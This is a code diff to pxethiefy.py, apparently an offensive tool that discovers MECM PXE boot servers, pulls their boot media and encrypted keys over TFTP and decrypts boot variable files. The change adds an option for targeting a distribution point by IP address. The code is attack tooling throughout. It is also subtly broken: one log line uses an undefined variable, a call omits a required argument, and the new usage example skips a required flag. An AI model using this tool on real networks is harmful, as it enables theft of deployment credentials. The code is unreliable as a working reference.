@@ -234,7 +234,7 @@ def process_pxe_media_xml(media_xml):
         log("Error while trying to process media xml...", MSG_TYPE_ERROR)
 
 
-def find_and_loot_on_interface(interface):
+def find_and_loot(interface, dp_ip_addr_str):
     # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
     bind_layers(UDP,BOOTP,dport=4011,sport=68)
     bind_layers(UDP,BOOTP,dport=68,sport=4011)
@@ -251,9 +251,15 @@ def find_and_loot_on_interface(interface):
     log(f"  IP: {client_ip_addr}", MSG_TYPE_DEFAULT)
     log(f"  MAC: {client_mac_addr_str}", MSG_TYPE_DEFAULT)
 
-    tftp_servers = find_pxe_boot_servers(interface, client_mac_addr)
+    if (dp_ip_addr_str):
+        log(f"  DP: {dp_ip_addr_str}", MSG_TYPE_DEFAULT)
+        tftp_servers = [dp_ip_addr_str]
+    else:
+        tftp_servers = find_pxe_boot_servers(interface, client_mac_addr)
+        if (tftp_servers):
+            log(f"Found server offering PXE media: {tftp_server}", MSG_TYPE_SUCCESS)
+    
     for tftp_server in tftp_servers:
-        log(f"Found server offering PXE media: {tftp_server}", MSG_TYPE_SUCCESS)
         ## Looking for media
         log(f"Looking for PXE media files...", MSG_TYPE_DEFAULT)
         variables_file, bcd_file, encrypted_key = request_boot_files(interface, client_ip_addr, client_mac_addr, tftp_server)
@@ -303,14 +309,18 @@ def main():
     parser = argparse.ArgumentParser(description="""
 [**] Examples: 
     pxethiefy.py explore -i eth0
+    pxethiefy.py explore -i eth0 -a 192.0.2.50                    
     pxethiefy.py decrypt -p "password" -f ./2023.05.05.10.43.44.0001.{85CA0850-35DC-4A1F-A0B8-8A546B317DD1}.boot.var
 """, formatter_class=argparse.RawTextHelpFormatter)
     subparsers = parser.add_subparsers(title='subcommands', dest="subcommands")
     ## Find and loot
     find_and_loot_parser = subparsers.add_parser('explore', formatter_class=argparse.RawTextHelpFormatter, description="""
 [**] Query for PXE servers and media on the network
-[**] Example: pxethiefy.py explore -i eth0", help="Query for PXE servers and media on the network
-""")
+[**] Examples: 
+    pxethiefy.py explore -i eth0
+    pxethiefy.py explore -a 192.0.2.50
+""", help="Query for PXE servers and media on the network")
+    find_and_loot_parser.add_argument('-a', '--address', required=False, type=str, dest='dp_ip_addr_str', help="Specify the IP address of a PXE-enabled distribution point instead of discovering on network..")
     find_and_loot_parser.add_argument('-i', '--interface', required=True, type=str, dest='interface', help="Interface to use to search for PXE servers..")
     ## Decrypt
     decrypt_parser = subparsers.add_parser('decrypt', formatter_class=argparse.RawTextHelpFormatter, description="""
@@ -325,8 +335,10 @@ def main():
 
     ## Find and loot
     if( args.subcommands == 'explore'):
-        if (args.interface ):
-            find_and_loot_on_interface(args.interface)
+        if (args.dp_ip_addr_str):
+            find_and_loot(args.interface, args.dp_ip_addr_str)
+        elif (args.interface):
+            find_and_loot(args.interface)
         else:
             find_and_loot_parser.print_help()
     
